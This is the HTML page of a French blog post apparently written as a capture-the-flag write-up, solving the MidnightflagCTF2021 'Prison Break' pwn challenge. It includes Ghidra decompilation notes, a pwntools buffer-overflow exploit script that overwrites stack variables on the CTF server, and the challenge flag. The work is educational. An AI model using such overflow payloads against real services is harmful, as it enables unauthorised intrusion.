<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>MCTF2021 - Pwn - Prison Break | kik0uO7</title>
<meta name="generator" content="Jekyll v4.1.1" />
<meta property="og:title" content="MCTF2021 - Pwn - Prison Break" />
<meta name="author" content="kik0uO7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="MidnightflagCTF2021 Organisé par l’ESN’hack. La CTF c’est déroulée la nuit du 10/04/21 au 11/04/21. Grâce à ABH le pro de l’OSINT, on termine dans le TOP 10 du classement général. TL;DR Décompilation via dans ghidra Compréhension du challenge Implémentation en python Task [Noiche] : J’ai été envoyé au goulag l’année dernière à cause de mes challenges de PWN… Venez m’aider à sortir d’ici et je vous récompenserai :p Accès au challenge : nc ctf.midnightflag.fr 9021 prison_break Décompilation Pour décompiler le binaire, j’utilise ghidra. Compréhension Le but du challenge est de mettre les bonnes valeurs dans les variables suivants le buffer. Pour obtenir le flag, il faut : Se connecter au serveur Faire une buffer overflow du tableau de caractères Les valeurs à mettre sont : 0x1000 0x0 0xb3350000 0xfffffe49 0x800 Implémentation from pwn import * target = remote(&quot;ctf.midnightflag.fr&quot;, 9021) payload = b&#39;A&#39; * 256 payload += p32(0x1000) payload += p32(0x0) payload += p32(0xb3350000) payload += p32(0xfffffe49) payload += p32(0x800) target.sendline(payload) flag = target.recvall().strip().split(b&#39; &#39;)[-1].decode() log.success(flag) Flag MCTF{___1m_fr33_!_1_c4n_m4k3_m0r3_ch4ll5_n0w_!!!___}" />
<meta property="og:description" content="MidnightflagCTF2021 Organisé par l’ESN’hack. La CTF c’est déroulée la nuit du 10/04/21 au 11/04/21. Grâce à ABH le pro de l’OSINT, on termine dans le TOP 10 du classement général. TL;DR Décompilation via dans ghidra Compréhension du challenge Implémentation en python Task [Noiche] : J’ai été envoyé au goulag l’année dernière à cause de mes challenges de PWN… Venez m’aider à sortir d’ici et je vous récompenserai :p Accès au challenge : nc ctf.midnightflag.fr 9021 prison_break Décompilation Pour décompiler le binaire, j’utilise ghidra. Compréhension Le but du challenge est de mettre les bonnes valeurs dans les variables suivants le buffer. Pour obtenir le flag, il faut : Se connecter au serveur Faire une buffer overflow du tableau de caractères Les valeurs à mettre sont : 0x1000 0x0 0xb3350000 0xfffffe49 0x800 Implémentation from pwn import * target = remote(&quot;ctf.midnightflag.fr&quot;, 9021) payload = b&#39;A&#39; * 256 payload += p32(0x1000) payload += p32(0x0) payload += p32(0xb3350000) payload += p32(0xfffffe49) payload += p32(0x800) target.sendline(payload) flag = target.recvall().strip().split(b&#39; &#39;)[-1].decode() log.success(flag) Flag MCTF{___1m_fr33_!_1_c4n_m4k3_m0r3_ch4ll5_n0w_!!!___}" />
<link rel="canonical" href="http://localhost:4000/mctf2021_prison_break" />
<meta property="og:url" content="http://localhost:4000/mctf2021_prison_break" />
<meta property="og:site_name" content="kik0uO7" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-04-11T23:53:12+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="MCTF2021 - Pwn - Prison Break" />
<script type="application/ld+json">
{"url":"http://localhost:4000/mctf2021_prison_break","headline":"MCTF2021 - Pwn - Prison Break","dateModified":"2021-04-11T23:53:12+02:00","datePublished":"2021-04-11T23:53:12+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/mctf2021_prison_break"},"description":"MidnightflagCTF2021 Organisé par l’ESN’hack. La CTF c’est déroulée la nuit du 10/04/21 au 11/04/21. Grâce à ABH le pro de l’OSINT, on termine dans le TOP 10 du classement général. TL;DR Décompilation via dans ghidra Compréhension du challenge Implémentation en python Task [Noiche] : J’ai été envoyé au goulag l’année dernière à cause de mes challenges de PWN… Venez m’aider à sortir d’ici et je vous récompenserai :p Accès au challenge : nc ctf.midnightflag.fr 9021 prison_break Décompilation Pour décompiler le binaire, j’utilise ghidra. Compréhension Le but du challenge est de mettre les bonnes valeurs dans les variables suivants le buffer. Pour obtenir le flag, il faut : Se connecter au serveur Faire une buffer overflow du tableau de caractères Les valeurs à mettre sont : 0x1000 0x0 0xb3350000 0xfffffe49 0x800 Implémentation from pwn import * target = remote(&quot;ctf.midnightflag.fr&quot;, 9021) payload = b&#39;A&#39; * 256 payload += p32(0x1000) payload += p32(0x0) payload += p32(0xb3350000) payload += p32(0xfffffe49) payload += p32(0x800) target.sendline(payload) flag = target.recvall().strip().split(b&#39; &#39;)[-1].decode() log.success(flag) Flag MCTF{___1m_fr33_!_1_c4n_m4k3_m0r3_ch4ll5_n0w_!!!___}","@type":"BlogPosting","author":{"@type":"Person","name":"kik0uO7"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="kik0uO7" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">kik0uO7</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/posts/">Related posts</a><a class="page-link" href="/tags/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">MCTF2021 - Pwn - Prison Break</h1>
    <p class="post-meta"><time class="dt-published" datetime="2021-04-11T23:53:12+02:00" itemprop="datePublished">
        Apr 11, 2021
      </time>• 
          <span itemprop="author" itemscope itemtype="http://schema.org/Person">
            <span class="p-author h-card" itemprop="name">kik0uO7</span></span></p>
      
      
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <h1 id="midnightflagctf2021">MidnightflagCTF2021</h1>
<p>Organisé par l’ESN’hack. La CTF c’est déroulée la nuit du 10/04/21 au 11/04/21.
Grâce à <a href="https://www.abhw0rld.com/">ABH</a> le pro de l’OSINT, on termine dans le TOP 10 du classement général.</p>

<p><img src="assets/ctf/MCTF2021/scoreboard.png" alt="scoreboard" /></p>

<h1 id="tldr">TL;DR</h1>
<ol>
  <li>Décompilation via dans <code class="language-plaintext highlighter-rouge">ghidra</code></li>
  <li>Compréhension du challenge</li>
  <li>Implémentation en python</li>
</ol>

<h1 id="task">Task</h1>
<p>[Noiche] : J’ai été envoyé au goulag l’année dernière à cause de mes challenges de PWN… Venez m’aider à sortir d’ici et je vous récompenserai :p</p>

<p>Accès au challenge : nc ctf.midnightflag.fr 9021</p>

<p><a href="https://ctf.midnightflag.fr/files/a54b25555b9f5947e353939730fcaf67/prison_break?token=eyJ1c2VyX2lkIjoxNSwidGVhbV9pZCI6NSwiZmlsZV9pZCI6NTF9.YHNrmg.oTGHvjYs4LrfB1u4D_zjOpzEE-I">prison_break</a></p>

<h1 id="décompilation">Décompilation</h1>
<p><img src="assets/ctf/MCTF2021/prison_break_file.png" alt="prison_break" /></p>

<p>Pour décompiler le binaire, j’utilise <strong>ghidra</strong>.</p>

<p><img src="assets/ctf/MCTF2021/prison_break_ghidra.png" alt="prison_break_ghidra" /></p>

<h1 id="compréhension">Compréhension</h1>
<p>Le but du challenge est de mettre les bonnes valeurs dans les variables suivants le buffer.</p>

<p>Pour obtenir le flag, il faut :</p>
<ul>
  <li>Se connecter au serveur</li>
  <li>Faire une buffer overflow du tableau de caractères</li>
  <li>Les valeurs à mettre sont :
    <ul>
      <li>0x1000</li>
      <li>0x0</li>
      <li>0xb3350000</li>
      <li>0xfffffe49</li>
      <li>0x800</li>
    </ul>
  </li>
</ul>

<h1 id="implémentation">Implémentation</h1>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">target</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"ctf.midnightflag.fr"</span><span class="p">,</span> <span class="mi">9021</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">256</span> 
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> 
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb3350000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xfffffe49</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>

<span class="n">target</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">flag</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">b' '</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">()</span>

<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<h1 id="flag">Flag</h1>
<p><code class="language-plaintext highlighter-rouge">MCTF{___1m_fr33_!_1_c4n_m4k3_m0r3_ch4ll5_n0w_!!!___}</code></p>

  </div><a class="u-url" href="/mctf2021_prison_break" hidden></a>
</article>
      </div>
    </main><!-- ici y'aura peut être des trucs --></body>

</html>
